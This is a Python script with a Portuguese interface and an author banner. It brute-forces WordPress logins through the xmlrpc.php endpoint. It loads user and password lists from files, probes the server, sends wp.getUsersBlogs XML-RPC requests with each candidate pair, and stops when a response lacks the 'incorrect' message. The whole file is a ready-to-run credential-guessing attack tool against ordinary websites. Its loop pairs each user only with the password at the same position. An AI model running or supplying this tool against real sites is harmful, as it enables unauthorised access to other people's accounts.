import requests, sys, os

print("""
____  ___       .____            __________         ___________    ________  .__   
\   \/  / _____ |    |     ______\______   \ ____   \__    ___/___ \_____  \ |  |  
 \     / /     \|    |     \_  __ \     ___// ___\    |    | /  _ \ /   |   \|  |  
 /     \|  Y Y  \    |___   |  | \/    |   \  \___    |    |(  <_> )    |    \  |__
/___/\  \__|_|  /_______ \  |__|  |____|    \___  >   |____| \____/\_______  /____/
      \_/     \/        \/                      \/                         \/      

Created by henriquedev (henriquedev.com) @ 2023
""")


info = input("[+] URL do alvo (incluindo o local do arquivo, ex. xmlrpc.php): ")
user_agent = input("[+] Digite um User-Agent válido (deixe em branco para usar o padrão da tool): ")
users = input("[+] Informe o path da list de usuários a serem testados: ")
passwords = input("[+] Informe o path da lista de senhas a serem testadas: ")

if not ".php" in info:
    print("[-] Não foi encontrado nenhum arquivo PHP na URL informada!")
else:
    if user_agent == '':
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
    url = info
    xml = """
        <methodCall> 
        <methodName>system.listMethods</methodName> 
        <params></params> 
        </methodCall>
    """
    headers = {'Content-Type': 'application/xml', 'User-Agent': user_agent}
    print("[+] Testando conexão com o servidor...")
    try:
        r = requests.post(url, data=xml, headers=headers)
        if r.status_code != 200:
            error_status_code = input(f"[-] O servidor retornou status-code diferente de 200 ({r.status_code}). Deseja continuar mesmo assim? (s/N) ").lower()
            if error_status_code == 'n' or error_status_code == 'nao':
                sys.exit(1)
    except Exception as e:
        print(f"[-] Um erro ocorreu.\n\n{e}")
        sys.exit(1)

    list_users = list()
    list_passwords = list()

    u = open(users, "r")
    p = open(passwords, "r")

    for line in u.readlines():
        list_users.append(line.replace('\n', ''))

    for line in p.readlines():
        list_passwords.append(line.replace('\n', ''))

    n = 0
    for user in list_users:
        payload = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall> 
            <methodName>wp.getUsersBlogs</methodName> 
            <params> 
            <param><value>\{user}</value></param> 
            <param><value>\{list_passwords[n]}</value></param> 
            </params> 
            </methodCall>
        """
        r = requests.post(url, data=payload, headers=headers)
        if "Nome de usuário ou senha incorretos." in r.text or "incorrect" in r.text or "incorrects" in r.text:
            print(f"[+] Testado: {user}/{list_passwords[n]}")
        else:
            print(f"[+] Nome de usuário e senha encontrados: {user}/{list_passwords[n]}")
            sys.exit(1)
        n += 1
